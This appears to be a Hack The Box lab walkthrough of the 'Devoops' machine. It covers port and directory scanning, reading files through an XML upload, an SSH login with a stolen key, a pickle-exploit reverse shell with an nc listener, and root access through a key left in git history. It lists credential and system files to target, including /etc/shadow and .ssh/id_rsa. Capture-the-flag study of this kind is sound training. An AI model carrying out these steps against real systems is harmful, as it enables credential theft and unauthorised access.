# Devoops Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA devoops 10.10.10.91 -T4``

![image](https://user-images.githubusercontent.com/123066149/229831612-cde018e6-60b1-4efd-8133-e87d7ffa65c7.png)

``sleep 200; nmap -p- -sV -T4 -oA fulldevoops 10.10.10.91``

![image](https://user-images.githubusercontent.com/123066149/229831842-3092e3cf-fc9a-4837-bc2c-f38ef228bf46.png)

``gobuster dir -u http://10.10.10.91:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt``

![image](https://user-images.githubusercontent.com/123066149/229832708-da79001a-2616-49ac-90c4-d5efcff2b2e3.png)

``gobuster dir -u http://10.10.10.91:5000/uploads/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x xml,txt,php,html,sh,py ``

# ${{\color{purple}Initial Foothold}}\ $

### We have a file upload :

![image](https://user-images.githubusercontent.com/123066149/229834429-3a0bb413-1509-437b-a2bf-d544d18f20e9.png)

### When i try to upload a regular file :

![image](https://user-images.githubusercontent.com/123066149/229835999-9a39a996-576b-4367-814c-2b56eb82ba72.png)

### When i try to upload an xml file :

content-type: ``application/xml;charset=UTF-8``

``<?xml version="1.0" encoding="UTF-8" standalone="no"?>``

``<root>``

``<Author>test</Author>``

``<Subject>test</Subject>``

``<Content>test</Content>``

``</root>``

![image](https://user-images.githubusercontent.com/123066149/229836802-9dbff7ba-ea15-4dcb-94d9-4d0caf63fbc5.png)

![image](https://user-images.githubusercontent.com/123066149/229838198-3c17956a-5592-4611-bfc9-14c47b21c705.png)

![image](https://user-images.githubusercontent.com/123066149/229838093-6430bfe8-46a6-4aaa-ba64-bd3d0e176386.png)

### Finding rsa private key

etc/passwd

/etc/hosts

/etc/group

/etc/resolv.conf

/etc/shadow

/home/[USERNAME]/.bash_history or .profile

/home/[USERNAME]/.bash_history 

/home/[USERNAME]/.profile

/home/[USERNAME]/.ssh/id_rsa

/home/[USERNAME]/.ssh/id_rsa

/home/[USERNAME]/.ssh/authorized_keys

/home/[USERNAME]/.id_rsa

/home/[USERNAME]/.authorized_keys

/home/[USERNAME]/ssh/authorized_keys

/home/[USERNAME]/ssh/id_rsa

![image](https://user-images.githubusercontent.com/123066149/229838526-d41545d3-e703-4dd7-9410-ce019413941c.png)

``chmod 600 privatekey.key``

``ssh -i privatekey.key roosa@10.10.10.91``

![image](https://user-images.githubusercontent.com/123066149/229840275-c205fe01-ba55-4e5d-aa24-eb3b77faca9e.png)


# ${{\color{purple}Exploitation}}\ $

### Other way :

``cat feed.py``

![image](https://user-images.githubusercontent.com/123066149/229841210-9f634116-c294-4bde-b53c-6ff184995a14.png)

``vi pickle_exploit.py``

![image](https://user-images.githubusercontent.com/123066149/229841462-c78f723b-60c9-440c-9c5e-1125374e130a.png)

``python2.7 pickle_exploit.py``

![image](https://user-images.githubusercontent.com/123066149/229841622-312f9e00-ef01-48ba-998e-3594cad070bc.png)

``nc -nlvp 1234``

### Care the content type is TEXT

![image](https://user-images.githubusercontent.com/123066149/229841762-d227f214-ef54-49dd-a43f-9c776d252ac2.png)

![image](https://user-images.githubusercontent.com/123066149/229841897-a35ebf33-6666-4048-81ab-18988830379f.png)

# ${{\color{purple}Privilege Escalation}}\ $

`` find . -name git``

`` find . -name .git``

![image](https://user-images.githubusercontent.com/123066149/229842575-d9c474e0-5868-4baf-82ff-798b742ea048.png)

``git log``

![image](https://user-images.githubusercontent.com/123066149/229842861-d11ea991-dad1-48ad-ab79-4b70c3df9e6a.png)

### Don't go in the .git directory :

![image](https://user-images.githubusercontent.com/123066149/229843514-e98717a1-ae59-40e2-8c25-497748a1010b.png)

``git diff d387abf63e05c9628a59195cec9311751bdb283f``

![image](https://user-images.githubusercontent.com/123066149/229843761-7deec5b6-e1fd-4b8b-acd4-8f5403f93316.png)

``chmod 600``

``ssh -i privatekey root@ip``

![image](https://user-images.githubusercontent.com/123066149/229844331-aef01eab-da3e-49df-8368-c1dc10b42269.png)

# ${{\color{purple}Points of Improvement}}\ $
